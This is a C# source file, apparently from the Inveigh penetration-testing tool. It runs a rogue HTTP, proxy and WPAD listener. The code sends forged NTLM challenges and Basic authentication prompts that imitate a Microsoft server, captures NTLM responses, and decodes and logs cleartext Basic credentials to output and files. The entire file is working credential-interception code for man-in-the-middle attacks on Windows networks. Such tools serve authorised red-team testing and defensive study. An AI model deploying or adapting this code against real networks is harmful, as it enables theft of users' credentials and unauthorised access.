using System;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace Inveigh
{
    class HTTP
    {

        public static void HTTPListener(string httpIP, string httpPort, string ipVersion, string ntlmChallenge, string computerName, string dnsDomain,
            string netbiosDomain, string httpBasicRealm, string httpAuth, string httpResponse, string wpadAuth, string wpadResponse, string[] wpadAuthIgnore,
            string[] proxyIgnore, bool proxyListener)
        {
            TcpListener httpListener = null;
            TcpClient httpClient = new TcpClient();
            IAsyncResult httpAsync;
            string httpType = "HTTP";
            IPAddress httpListenerIP = IPAddress.Any;

            if (String.Equals(ipVersion, "IPv4") && !String.Equals(httpIP, "0.0.0.0"))
            {
                httpListenerIP = IPAddress.Parse(httpIP);
            }
            else if (String.Equals(ipVersion, "IPv6"))
            {
                httpListenerIP = IPAddress.IPv6Any;
            }

            httpListener = new TcpListener(httpListenerIP, Int32.Parse(httpPort));

            if (proxyListener)
            {
                httpType = "Proxy";
                httpListener.Server.LingerState = new LingerOption(true,0);
            }

            try
            {
                httpListener.Start();
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting unprivileged {1} listener, check IP and port usage.", DateTime.Now.ToString("s"), httpType));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {
                httpAsync = httpListener.BeginAcceptTcpClient(null, null);

                do
                {
                    System.Threading.Thread.Sleep(10);

                    if (Program.exitInveigh)
                    {
                        break;
                    }

                }
                while (!httpAsync.IsCompleted);

                httpClient = httpListener.EndAcceptTcpClient(httpAsync);
                object[] httpParams = { httpIP, httpPort, httpType, ntlmChallenge, computerName, dnsDomain, netbiosDomain, httpBasicRealm, httpAuth, httpResponse, wpadAuth, wpadResponse, wpadAuthIgnore, proxyIgnore, proxyListener, httpClient };
                ThreadPool.QueueUserWorkItem(new WaitCallback(GetHTTPClient), httpParams);
            }

        }

        public static void GetHTTPClient(object Params)
        {
            var args = Params;
            object[] httpParams = Params as object[];
            string httpIP = Convert.ToString(httpParams[0]);
            string httpPort = Convert.ToString(httpParams[1]);
            string httpType = Convert.ToString(httpParams[2]);
            string ntlmChallenge = Convert.ToString(httpParams[3]);
            string computerName = Convert.ToString(httpParams[4]);
            string dnsDomain = Convert.ToString(httpParams[5]);
            string netbiosDomain = Convert.ToString(httpParams[6]);
            string httpBasicRealm = Convert.ToString(httpParams[7]);
            string httpAuth = Convert.ToString(httpParams[8]);
            string httpResponse = Convert.ToString(httpParams[9]);
            string wpadAuth = Convert.ToString(httpParams[10]);
            string wpadResponse = Convert.ToString(httpParams[11]);
            string[] wpadAuthIgnore = Array.ConvertAll((object[])httpParams[12], Convert.ToString);
            string[] proxyIgnore = Array.ConvertAll((object[])httpParams[13], Convert.ToString);
            bool proxyListener = Convert.ToBoolean(httpParams[14]);
            TcpClient httpClient = (TcpClient)httpParams[15];           
            string httpRawURL = "";
            string httpRawURLOld = "";
            NetworkStream httpStream = null;
            httpStream = httpClient.GetStream();
            int httpReset = 0;

            while (httpClient.Connected)
            {

                try
                {
                    string httpContentLength = "Content-Length: 0";
                    string httpMethod = "";
                    string httpRequest = "";
                    string authorizationNTLM = "NTLM";
                    bool httpSend = true;
                    bool proxyIgnoreMatch = false;
                    bool wpadAuthIgnoreMatch = false;
                    bool ntlmESS = false;
                    byte[] httpHeaderContentType = Encoding.UTF8.GetBytes("Content-Type: text/html");
                    byte[] httpHeaderAuthenticate = null;
                    byte[] httpHeaderAuthenticateData = null;
                    byte[] httpHeaderCacheControl = null;
                    byte[] httpHeaderStatusCode = null;
                    byte[] httpResponsePhrase = null;
                    byte[] httpMessage = null;
                    string httpHeaderAuthorization = "";
                    string httpHeaderHost = "";
                    string httpHeaderUserAgent = "";
                    byte[] httpRequestData = new byte[4096];
                    bool httpClientClose = false;
                    bool httpConnectionHeaderClose = false;
                    httpReset++;

                    while (httpStream.DataAvailable)
                    {
                        httpStream.Read(httpRequestData, 0, httpRequestData.Length);
                    }

                    httpRequest = System.BitConverter.ToString(httpRequestData);

                    if (!String.IsNullOrEmpty(httpRequest) && (httpRequest.StartsWith("47-45-54-20") || httpRequest.StartsWith("48-45-41-44-20") || httpRequest.StartsWith("4F-50-54-49-4F-4E-53-20") || httpRequest.StartsWith("43-4F-4E-4E-45-43-54-20") || httpRequest.StartsWith("50-4F-53-54-20")))
                    {
                        httpRawURL = httpRequest.Substring(httpRequest.IndexOf("-20-") + 4, httpRequest.Substring(httpRequest.IndexOf("-20-") + 1).IndexOf("-20-") - 3);
                        httpRawURL = Util.HexStringToString(httpRawURL);
                        string httpSourceIP = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Address.ToString();
                        string httpSourcePort = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Port.ToString();
                        httpConnectionHeaderClose = true;

                        if (httpRequest.StartsWith("47-45-54-20"))
                        {
                            httpMethod = "GET";
                        }
                        else if (httpRequest.StartsWith("48-45-41-44-20"))
                        {
                            httpMethod = "HEAD";
                        }
                        else if (httpRequest.StartsWith("4F-50-54-49-4F-4E-53-20"))
                        {
                            httpMethod = "OPTIONS";
                        }
                        else if (httpRequest.StartsWith("43-4F-4E-4E-45-43-54-20"))
                        {
                            httpMethod = "CONNECT";
                        }
                        else if (httpRequest.StartsWith("50-4F-53-54-20"))
                        {
                            httpMethod = "POST";
                        }

                        if (httpRequest.Contains("-48-6F-73-74-3A-20-"))
                        {
                            httpHeaderHost = httpRequest.Substring(httpRequest.IndexOf("-48-6F-73-74-3A-20-") + 19);
                            httpHeaderHost = httpHeaderHost.Substring(0, httpHeaderHost.IndexOf("-0D-0A-"));
                            httpHeaderHost = Util.HexStringToString(httpHeaderHost);
                        }

                        if (httpRequest.Contains("-55-73-65-72-2D-41-67-65-6E-74-3A-20-"))
                        {
                            httpHeaderUserAgent = httpRequest.Substring(httpRequest.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37);
                            httpHeaderUserAgent = httpHeaderUserAgent.Substring(0, httpHeaderUserAgent.IndexOf("-0D-0A-"));
                            httpHeaderUserAgent = Util.HexStringToString(httpHeaderUserAgent);
                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) HTTP {3} request for {4} from {5}:{6}", DateTime.Now.ToString("s"), httpType, httpPort, httpMethod, httpRawURL, httpSourceIP, httpSourcePort));
                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) HTTP host header {3} from {4}:{5}", DateTime.Now.ToString("s"), httpType, httpPort, httpHeaderHost, httpSourceIP, httpSourcePort));

                            if (!String.IsNullOrEmpty(httpHeaderUserAgent))
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) HTTP user agent from {3}:{4}:{5}{6}", DateTime.Now.ToString("s"), httpType, httpPort, httpSourceIP, httpSourcePort, System.Environment.NewLine, httpHeaderUserAgent));
                            }

                        }

                        if (Program.enabledProxy && proxyIgnore != null && proxyIgnore.Length > 0)
                        {

                            foreach (string agent in proxyIgnore)
                            {

                                if (httpHeaderUserAgent.ToUpper().Contains(agent.ToUpper()))
                                {
                                    proxyIgnoreMatch = true;
                                }

                            }

                            if (proxyIgnoreMatch)
                            {
                                lock (Program.outputList)
                                {
                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) ignoring wpad.dat request for proxy due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), httpType, httpPort, httpSourceIP, httpSourcePort));

                                }

                            }

                        }

                        if (httpRequest.Contains("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-"))
                        {
                            httpHeaderAuthorization = httpRequest.Substring(httpRequest.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46);
                            httpHeaderAuthorization = httpHeaderAuthorization.Substring(0, httpHeaderAuthorization.IndexOf("-0D-0A-"));
                            httpHeaderAuthorization = Util.HexStringToString(httpHeaderAuthorization);
                        }

                        if (wpadAuthIgnore != null && wpadAuthIgnore.Length > 0 && wpadAuth.ToUpper().StartsWith("NTLM "))
                        {

                            foreach (string agent in wpadAuthIgnore)
                            {

                                if (httpHeaderUserAgent.ToUpper().Contains(agent.ToUpper()))
                                {
                                    wpadAuthIgnoreMatch = true;
                                }

                            }

                            if (wpadAuthIgnoreMatch)
                            {

                                lock (Program.outputList)
                                {
                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) switching wpad.dat auth to anonymous due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), httpType, httpPort, httpSourceIP, httpSourcePort));
                                }

                            }

                        }

                        if (!String.Equals(httpRawURL, "/wpad.dat") && String.Equals(httpAuth, "ANONYMOUS") || String.Equals(httpRawURL, "/wpad.dat") && String.Equals(wpadAuth, "ANONYMOUS") || wpadAuthIgnoreMatch)
                        {
                            httpHeaderStatusCode = new byte[] { 0x32, 0x30, 0x30 };
                            httpResponsePhrase = new byte[] { 0x4f, 0x4b };
                            httpClientClose = true;
                        }
                        else
                        {

                            if (String.Equals(httpRawURL, "/wpad.dat") && String.Equals(wpadAuth, "NTLM") || String.Equals(httpRawURL, "/wpad.dat") && String.Equals(httpAuth, "NTLM"))
                            {
                                ntlmESS = true;
                            }

                            if (proxyListener)
                            {
                                httpHeaderStatusCode = new byte[] { 0x34, 0x30, 0x37 };
                                httpHeaderAuthenticate = new byte[] { 0x50, 0x72, 0x6f, 0x78, 0x79, 0x2d, 0x41, 0x75, 0x74, 0x68, 0x65, 0x6e, 0x74, 0x69, 0x63, 0x61, 0x74, 0x65, 0x3a, 0x20 };
                            }
                            else
                            {
                                httpHeaderStatusCode = new byte[] { 0x34, 0x30, 0x31 };
                                httpHeaderAuthenticate = new byte[] { 0x57, 0x57, 0x57, 0x2d, 0x41, 0x75, 0x74, 0x68, 0x65, 0x6e, 0x74, 0x69, 0x63, 0x61, 0x74, 0x65, 0x3a, 0x20 };
                            }

                            httpResponsePhrase = new byte[] { 0x55, 0x6e, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64 };
                        }

                        if (httpHeaderAuthorization.ToUpper().StartsWith("NTLM "))
                        {
                            httpHeaderAuthorization = httpHeaderAuthorization.Substring(5, httpHeaderAuthorization.Length - 5);
                            byte[] httpAuthorization = System.Convert.FromBase64String(httpHeaderAuthorization);
                            httpConnectionHeaderClose = false;

                            if ((System.BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("01-00-00-00"))
                            {
                                authorizationNTLM = GetNTLMChallengeBase64(ntlmESS, ntlmChallenge, httpSourceIP, httpSourcePort, Int32.Parse(httpPort), computerName, netbiosDomain, dnsDomain, httpType);
                            }
                            else if ((System.BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("03-00-00-00"))
                            {
                                NTLM.GetNTLMResponse(httpAuthorization, httpSourceIP, httpSourcePort, httpType, httpPort);
                                httpHeaderStatusCode = new byte[] { 0x32, 0x30, 0x30 };
                                httpResponsePhrase = new byte[] { 0x4f, 0x4b };
                                httpClientClose = true;

                                if (proxyListener)
                                {

                                    if (!String.IsNullOrEmpty(httpResponse))
                                    {
                                        httpHeaderCacheControl = Encoding.UTF8.GetBytes("Cache-Control: no-cache, no-store");
                                    }
                                    else
                                    {
                                        httpSend = false;
                                    }

                                }

                            }
                            else
                            {
                                httpClientClose = true;
                            }

                        }
                        else if (httpHeaderAuthorization.ToUpper().StartsWith("BASIC "))
                        {
                            httpHeaderStatusCode = new byte[] { 0x32, 0x30, 0x30 };
                            httpResponsePhrase = new byte[] { 0x4f, 0x4b };
                            httpHeaderAuthorization = httpHeaderAuthorization.Substring(6, httpHeaderAuthorization.Length - 6);
                            string cleartextCredentials = Encoding.UTF8.GetString(Convert.FromBase64String(httpHeaderAuthorization));

                            lock (Program.cleartextList)
                            {
                                Program.cleartextList.Add(String.Concat(httpSourceIP, " ", cleartextCredentials));
                            }

                            lock (Program.outputList)
                            {
                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) Basic authentication cleartext credentials captured from {3}({4}):", DateTime.Now.ToString("s"), httpType, httpPort, httpSourceIP, httpSourcePort));
                                Program.outputList.Add(cleartextCredentials);
                            }

                            if (Program.enabledFileOutput)
                            {

                                lock (Program.cleartextFileList)
                                {
                                    Program.cleartextFileList.Add(String.Concat(httpSourceIP, " ", cleartextCredentials));
                                }

                                Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) Basic authentication cleartext credentials written to {3}", DateTime.Now.ToString("s"), httpType, httpPort, String.Concat(Program.argFilePrefix, "-Cleartext.txt")));
                            }

                        }

                        if (!String.IsNullOrEmpty(wpadResponse) && !proxyIgnoreMatch && String.Equals(httpRawURL, "/wpad.dat") && httpClientClose)
                        {
                            httpHeaderContentType = Encoding.UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig");
                            httpMessage = Encoding.UTF8.GetBytes(wpadResponse);
                        }
                        else if (!String.IsNullOrEmpty(httpResponse))
                        {
                            httpMessage = Encoding.UTF8.GetBytes(httpResponse);
                        }

                        byte[] httpTimestamp = Encoding.UTF8.GetBytes(DateTime.Now.ToString("R"));

                        if ((httpAuth.StartsWith("NTLM") && !String.Equals(httpRawURL, "/wpad.dat")) || (wpadAuth.StartsWith("NTLM") && String.Equals(httpRawURL, "/wpad.dat")))
                        {
                            httpHeaderAuthenticateData = Encoding.UTF8.GetBytes(authorizationNTLM);
                        }
                        else if ((String.Equals(httpAuth, "BASIC") && !String.Equals(httpRawURL, "/wpad.dat")) || String.Equals(wpadAuth, "BASIC") && String.Equals(httpRawURL, "/wpad.dat"))
                        {
                            httpHeaderAuthenticateData = Encoding.UTF8.GetBytes(String.Concat("Basic realm=", httpBasicRealm));
                        }

                        using (MemoryStream httpMemoryStream = new MemoryStream())
                        {
                            httpMemoryStream.Write((new byte[9] { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20 }), 0, 9);
                            httpMemoryStream.Write(httpHeaderStatusCode, 0, httpHeaderStatusCode.Length);
                            httpMemoryStream.Write((new byte[1] { 0x20 }), 0, 1);
                            httpMemoryStream.Write(httpResponsePhrase, 0, httpResponsePhrase.Length);
                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (httpConnectionHeaderClose)
                            {
                                byte[] httpHeaderConnection = Encoding.UTF8.GetBytes("Connection: close");
                                httpMemoryStream.Write(httpHeaderConnection, 0, httpHeaderConnection.Length);
                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            byte[] httpHeaderServer = Encoding.UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0");
                            httpMemoryStream.Write(httpHeaderServer, 0, httpHeaderServer.Length);
                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            httpMemoryStream.Write((new byte[6] { 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20 }), 0, 6);
                            httpMemoryStream.Write(httpTimestamp, 0, httpTimestamp.Length);
                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (httpMessage != null && httpMessage.Length > 0)
                            {
                                httpContentLength = "Content-Length: " + httpMessage.Length;
                            }
                            else
                            {
                                httpContentLength = "Content-Length: 0";
                            }

                            byte[] httpHeaderContentLength = Encoding.UTF8.GetBytes(httpContentLength);
                            httpMemoryStream.Write(httpHeaderContentLength, 0, httpHeaderContentLength.Length);
                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (httpHeaderAuthenticate != null && httpHeaderAuthenticate.Length > 0 && httpHeaderAuthenticateData != null && httpHeaderAuthenticateData.Length > 0)
                            {
                                httpMemoryStream.Write(httpHeaderAuthenticate, 0, httpHeaderAuthenticate.Length);
                                httpMemoryStream.Write(httpHeaderAuthenticateData, 0, httpHeaderAuthenticateData.Length);
                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            if (httpHeaderContentType != null && httpHeaderContentType.Length > 0)
                            {
                                httpMemoryStream.Write(httpHeaderContentType, 0, httpHeaderContentType.Length);
                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            if (httpHeaderCacheControl != null && httpHeaderCacheControl.Length > 0)
                            {
                                httpMemoryStream.Write(httpHeaderCacheControl, 0, httpHeaderCacheControl.Length);
                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                            }

                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);

                            if (httpMessage != null && httpMessage.Length > 0)
                            {
                                httpMemoryStream.Write(httpMessage, 0, httpMessage.Length);
                            }

                            if (httpSend && httpStream.CanRead)
                            {
                                httpStream.Write(httpMemoryStream.ToArray(), 0, httpMemoryStream.ToArray().Length);
                                httpStream.Flush();
                            }

                        }

                        httpRawURLOld = httpRawURL;

                        if (httpClientClose)
                        {

                            if (proxyListener)
                            {
                                httpClient.Client.Close();
                            }
                            else
                            {
                                httpClient.Close();
                            }

                        }

                    }
                    else
                    {

                        if(httpConnectionHeaderClose || httpReset > 20)
                        {
                            httpClient.Close();
                        }
                        else
                        {
                            System.Threading.Thread.Sleep(10);
                        }

                    }

                    System.Threading.Thread.Sleep(100);
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] HTTP listener error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static string GetNTLMChallengeBase64(bool ntlmESS, string challenge, string ipAddress, string srcPort, int dstPort, string computerName, string netbiosDomain, string dnsDomain, string httpType)
        {
            byte[] httpTimestamp = System.BitConverter.GetBytes(DateTime.Now.ToFileTime());
            byte[] challengeArray = new byte[8];
            string session = ipAddress + ":" + srcPort;       
            string httpChallenge = "";

            if (String.IsNullOrEmpty(challenge))
            {
                string challengeCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                char[] challengeCharactersArray = new char[8];
                Random random = new Random();

                for (int i = 0; i < challengeCharactersArray.Length; i++)
                {
                    challengeCharactersArray[i] = challengeCharacters[random.Next(challengeCharacters.Length)];
                }

                string finalString = new String(challengeCharactersArray);
                challengeArray = Encoding.UTF8.GetBytes(finalString);
                httpChallenge = (System.BitConverter.ToString(challengeArray)).Replace("-", "");
            }
            else
            {
                httpChallenge = challenge;
                challenge = challenge.Insert(2, "-").Insert(5,"-").Insert(8,"-").Insert(11,"-").Insert(14,"-").Insert(17,"-").Insert(20,"-");
                int i = 0;

                foreach (string character in challenge.Split('-'))
                {
                    challengeArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                    i++;
                }

            }

            lock (Program.outputList)
            {
                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLM challenge {3} sent to {4}", DateTime.Now.ToString("s"), httpType, dstPort, httpChallenge, session));
            }

            Program.httpSessionTable[session] = httpChallenge;
            byte[] httpNTLMNegotiationFlags = { 0x05, 0x82, 0x81, 0x0A };

            if (ntlmESS)
            {
                httpNTLMNegotiationFlags[2] = 0x89;
            }

            byte[] hostnameBytes = System.Text.Encoding.Unicode.GetBytes(computerName);
            byte[] netbiosDomainBytes = System.Text.Encoding.Unicode.GetBytes(netbiosDomain);
            byte[] dnsDomainBytes = System.Text.Encoding.Unicode.GetBytes(dnsDomain);
            byte[] dnsHostnameBytes = System.Text.Encoding.Unicode.GetBytes(computerName);
            byte[] hostnameLength = System.BitConverter.GetBytes(hostnameBytes.Length).Take(2).ToArray();
            byte[] netbiosDomainLength = System.BitConverter.GetBytes(netbiosDomainBytes.Length).Take(2).ToArray(); ;
            byte[] dnsDomainLength = System.BitConverter.GetBytes(dnsDomainBytes.Length).Take(2).ToArray(); ;
            byte[] dnsHostnameLength = System.BitConverter.GetBytes(dnsHostnameBytes.Length).Take(2).ToArray(); ;
            byte[] targetLength = System.BitConverter.GetBytes(hostnameBytes.Length + netbiosDomainBytes.Length + dnsDomainBytes.Length + dnsDomainBytes.Length + dnsHostnameBytes.Length + 36).Take(2).ToArray(); ;
            byte[] targetOffset = System.BitConverter.GetBytes(netbiosDomainBytes.Length + 56);

            MemoryStream ntlmMemoryStream = new MemoryStream();
            ntlmMemoryStream.Write((new byte[12] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00 }), 0, 12);
            ntlmMemoryStream.Write(netbiosDomainLength, 0, 2);
            ntlmMemoryStream.Write(netbiosDomainLength, 0, 2);
            ntlmMemoryStream.Write((new byte[4] { 0x38, 0x00, 0x00, 0x00 }), 0, 4);
            ntlmMemoryStream.Write(httpNTLMNegotiationFlags, 0, 4);
            ntlmMemoryStream.Write(challengeArray, 0, challengeArray.Length);
            ntlmMemoryStream.Write((new byte[8] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 8);
            ntlmMemoryStream.Write(targetLength, 0, 2);
            ntlmMemoryStream.Write(targetLength, 0, 2);
            ntlmMemoryStream.Write(targetOffset, 0, 4);
            ntlmMemoryStream.Write((new byte[8] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f }), 0, 8);
            ntlmMemoryStream.Write(netbiosDomainBytes, 0, netbiosDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x02, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(netbiosDomainLength, 0, 2);
            ntlmMemoryStream.Write(netbiosDomainBytes, 0, netbiosDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x01, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(hostnameLength, 0, 2);
            ntlmMemoryStream.Write(hostnameBytes, 0, hostnameBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x04, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(dnsDomainLength, 0, 2);
            ntlmMemoryStream.Write(dnsDomainBytes, 0, dnsDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x03, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(dnsHostnameLength, 0, 2);
            ntlmMemoryStream.Write(dnsHostnameBytes, 0, dnsHostnameBytes.Length);
            ntlmMemoryStream.Write((new byte[2] { 0x05, 0x00 }), 0, 2);
            ntlmMemoryStream.Write(dnsDomainLength, 0, 2);
            ntlmMemoryStream.Write(dnsDomainBytes, 0, dnsDomainBytes.Length);
            ntlmMemoryStream.Write((new byte[4] { 0x07, 0x00, 0x08, 0x00 }), 0, 4);
            ntlmMemoryStream.Write(httpTimestamp, 0, httpTimestamp.Length);
            ntlmMemoryStream.Write((new byte[6] { 0x00, 0x00, 0x00, 0x00, 0x0a, 0x0a }), 0, 6);
            string ntlmChallengeBase64 = System.Convert.ToBase64String(ntlmMemoryStream.ToArray());
            string ntlm = "NTLM " + ntlmChallengeBase64;

            return ntlm;
        }

    }
}
